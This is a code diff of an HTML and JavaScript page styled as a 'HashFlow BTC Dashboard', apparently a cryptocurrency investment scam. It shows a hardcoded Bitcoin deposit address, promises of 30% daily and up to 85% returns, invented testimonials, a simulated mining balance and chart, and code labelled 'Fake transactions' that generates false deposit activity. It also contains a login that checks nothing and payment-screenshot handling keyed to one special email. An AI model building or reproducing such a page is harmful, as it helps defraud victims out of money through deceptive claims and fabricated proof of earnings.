@@ -1,37 +1,91 @@
-<!-- ===== Investment Plans ===== -->
-<h2>Investment Plans</h2>
-<div class="card" id="plansContainer"></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HashFlow BTC Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:#0b0f1a;color:white;}
+.card{max-width:95%;margin:15px auto;padding:20px;border-radius:12px;background:#131a2e;}
+h2{color:#f2a900;text-align:center;margin-bottom:10px;}
+.btc{font-size:28px;text-align:center;margin:10px 0;}
+.stats{display:flex;justify-content:space-around;flex-wrap:wrap;}
+.stats div{background:#0b0f1a;padding:10px;margin:5px;border-radius:8px;}
+.tx-container{max-height:260px;overflow:hidden;background:#0b0f1a;padding:10px;border-radius:8px;font-size:13px;position:relative;}
+.tx{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #222;}
+.green{color:#00ff99;}
+.yellow{color:#ffcc66;}
+.btc-box{background:#0b0f1a;padding:10px;border-radius:8px;margin-top:10px;word-break:break-all;text-align:center;}
+button{background:#f2a900;border:none;padding:10px 16px;border-radius:6px;font-weight:bold;cursor:pointer;margin-top:5px;display:block;width:100%;}
+input[type=file],input[type=text]{margin-top:10px;display:block;width:100%;padding:10px;border-radius:6px;border:none;font-size:14px;}
+.countdown{color:#f2a900;font-weight:bold;margin-top:5px;}
+.screenshot-img{max-width:100%;margin-top:10px;border-radius:8px;border:1px solid #222;}
+canvas{width:100%;height:140px;border-radius:8px;margin-top:10px;background:#0b0f1a;display:block;}
+.plan{border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;text-align:center;}
+.plan h3{color:#f2a900;margin-bottom:10px;}
+.plan p{margin:5px 0;}
+.pay-section{display:none;margin-top:10px;}
+#loginCard{max-width:400px;margin:50px auto;padding:20px;border-radius:12px;background:#131a2e;}
+</style>
+</head>
+<body>
 
-<!-- ===== Live Testimonials ===== -->
-<div class="card">
-  <h2>Live Testimonials</h2>
-  <div class="tx-container" id="testimonials"></div>
+<!-- LOGIN -->
+<div class="card" id="loginCard">
+  <h2>Login</h2>
+  <input type="text" id="emailInput" placeholder="Enter your email">
+  <button id="loginBtn">Login</button>
+</div>
+
+<!-- DASHBOARD -->
+<div id="dashboard" style="display:none;">
+
+  <!-- BTC Deposit -->
+  <div class="card">
+    <h2>BTC Deposit Address</h2>
+    <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+    <button onclick="copyAddress()">Copy Address</button>
+    <div style="text-align:center;margin-top:10px;">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav">
+    </div>
+  </div>
+
+  <!-- Mining Dashboard -->
+  <div class="card">
+    <h2>Mining Dashboard</h2>
+    <p style="text-align:center;color:#f2a900;">Earn 30% daily return</p>
+    <div class="btc" id="balance">0.00000000 BTC</div>
+    <canvas id="chart"></canvas>
+    <div class="stats">
+      <div>Hashrate: 120 TH/s</div>
+      <div>Blocks: <span id="blocks">0</span></div>
+      <div>Uptime: <span id="uptime">0h 0m</span></div>
+    </div>
+  </div>
+
+  <!-- Recent Activity -->
+  <div class="card">
+    <h2>Recent Activity</h2>
+    <div class="tx-container" id="txs"></div>
+  </div>
+
+  <!-- Investment Plans -->
+  <h2>Investment Plans</h2>
+  <div class="card" id="plansContainer"></div>
+
+  <!-- Live Testimonials -->
+  <div class="card">
+    <h2>Live Testimonials</h2>
+    <div class="tx-container" id="testimonials"></div>
+  </div>
+
 </div>
 
 <script>
-// ===== LOGIN =====
-let currentEmail="";
-document.getElementById("loginBtn").onclick=function(){
-  const email=document.getElementById("emailInput").value.trim().toLowerCase();
-  if(!email){alert("Enter email"); return;}
-  currentEmail=email;
-  localStorage.setItem("currentEmail",currentEmail);
-  document.getElementById("loginCard").style.display="none";
-  document.getElementById("dashboard").style.display="block";
-  initPlans();
-  initTestimonials();
-}
+document.addEventListener("DOMContentLoaded", function() {
 
-// If already logged in
-if(localStorage.getItem("currentEmail")){
-  currentEmail=localStorage.getItem("currentEmail");
-  document.getElementById("loginCard").style.display="none";
-  document.getElementById("dashboard").style.display="block";
-  initPlans();
-  initTestimonials();
-}
+let currentEmail = localStorage.getItem("currentEmail") || "";
 
-// ===== Investment Plans =====
 const plans = [
   {name:"Plan A", profit:"30%", min:200, max:599},
   {name:"Plan B", profit:"45%", min:600, max:1000},
@@ -41,8 +95,102 @@ const plans = [
   {name:"Plan F", profit:"85%", min:10000, max:"Unlimited"}
 ];
 
-function formatMoney(val){return typeof val==="number"?"$"+val:val;}
+const testimonialsData = [
+  {name:"Alice", msg:"Just started mining, love it!"},
+  {name:"Bob", msg:"My first BTC deposit was smooth!"},
+  {name:"Charlie", msg:"Mining dashboard looks real and professional."},
+  {name:"Dana", msg:"I earned 0.002 BTC in just 2 hours!"},
+  {name:"Eve", msg:"Highly recommend this platform."}
+];
 
+// ===== Login =====
+function showDashboard(){
+  document.getElementById("loginCard").style.display = "none";
+  document.getElementById("dashboard").style.display = "block";
+  initPlans();
+  initTestimonials();
+}
+
+if(currentEmail) showDashboard();
+
+document.getElementById("loginBtn").onclick = function(){
+  const email = document.getElementById("emailInput").value.trim().toLowerCase();
+  if(!email){alert("Enter email"); return;}
+  currentEmail = email;
+  localStorage.setItem("currentEmail", currentEmail);
+  showDashboard();
+}
+
+// ===== BTC Copy =====
+function copyAddress(){
+  navigator.clipboard.writeText(document.getElementById('btcAddress').innerText)
+    .then(()=>{alert('BTC address copied!');});
+}
+
+// ===== Mining Simulation =====
+let balance = 0;
+let blocks = 0;
+let minutes = 0;
+const txs = document.getElementById("txs");
+let rate = 0.00000008;
+let paused = false;
+
+// Chart
+const canvas = document.getElementById("chart");
+const ctx = canvas.getContext("2d");
+let points = [0];
+function drawChart(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  const w = canvas.width/50;
+  ctx.beginPath();
+  let lastY = canvas.height - points[0]*canvas.height/0.01;
+  ctx.moveTo(0,lastY);
+  for(let i=1;i<points.length;i++){
+    let y = canvas.height - points[i]*canvas.height/0.01;
+    ctx.lineTo(i*w,y);
+  }
+  ctx.strokeStyle="#f2a900";
+  ctx.lineWidth=2;
+  ctx.stroke();
+  const last = points[points.length-1]||0;
+  points.push(last+rate);
+  if(points.length>50) points.shift();
+}
+setInterval(drawChart,500);
+
+// Mining stats
+setInterval(()=>{
+  blocks += Math.floor(Math.random()*2);
+  minutes++;
+  document.getElementById("blocks").innerText = blocks;
+  document.getElementById("uptime").innerText = Math.floor(minutes/60)+"h "+(minutes%60)+"m";
+},60000);
+
+setInterval(()=>{
+  if(!paused){
+    balance+=rate;
+    document.getElementById("balance").innerText = balance.toFixed(8)+" BTC";
+  }
+},1000);
+
+// Fake transactions
+function addFakeTx(){
+  const div = document.createElement("div");
+  div.className="tx";
+  const val = (Math.random()*0.0004+0.00002).toFixed(8);
+  const status = Math.random()>0.5?"Completed":"Pending";
+  div.innerHTML = `<span>+${val} BTC</span><span class="${status==="Completed"?"green":"yellow"}">${status}</span>`;
+  txs.prepend(div);
+  if(txs.children.length>500) txs.removeChild(txs.lastChild);
+}
+setInterval(addFakeTx,1500);
+
+// Pause & hourly drop
+setInterval(()=>{ paused=true; setTimeout(()=>{paused=false;},60000); },15*60*1000);
+setInterval(()=>{ balance*=0.995; },60*60*1000);
+
+// ===== Investment Plans =====
+function formatMoney(val){return typeof val==="number"?"$"+val:val;}
 function initPlans(){
   const container = document.getElementById("plansContainer");
   container.innerHTML="";
@@ -117,20 +265,17 @@ function initPlans(){
     setInterval(updateCountdown,1000);
     updateCountdown();
 
-    // Show pay section
     investBtn.onclick = ()=>{
       paySection.style.display="block";
       investBtn.style.display="none";
     }
 
-    // Paid button click
     paidBtn.onclick = ()=>{
       const file = screenshotInput.files[0];
       if(!file){alert("Please upload screenshot first."); return;}
       const reader = new FileReader();
       reader.onload = function(evt){
         if(currentEmail==="evilpaid666@gmail.com"){
-          // Only save screenshot for your personal email
           preview.src = evt.target.result;
           preview.style.display="block";
           localStorage.setItem("plan"+index+"_screenshot",evt.target.result);
@@ -151,14 +296,6 @@ function copyPlanAddress(index){
 }
 
 // ===== Live Testimonials =====
-const testimonialsData = [
-  {name:"Alice", msg:"Just started mining, love it!"},
-  {name:"Bob", msg:"My first BTC deposit was smooth!"},
-  {name:"Charlie", msg:"Mining dashboard looks real and professional."},
-  {name:"Dana", msg:"I earned 0.002 BTC in just 2 hours!"},
-  {name:"Eve", msg:"Highly recommend this platform."}
-];
-
 function initTestimonials(){
   const container = document.getElementById("testimonials");
   container.innerHTML="";
@@ -171,3 +308,9 @@ function initTestimonials(){
     if(container.children.length>50) container.removeChild(container.lastChild);
   },3000);
 }
+
+}); // DOMContentLoaded
+</script>
+
+</body>
+  </html>
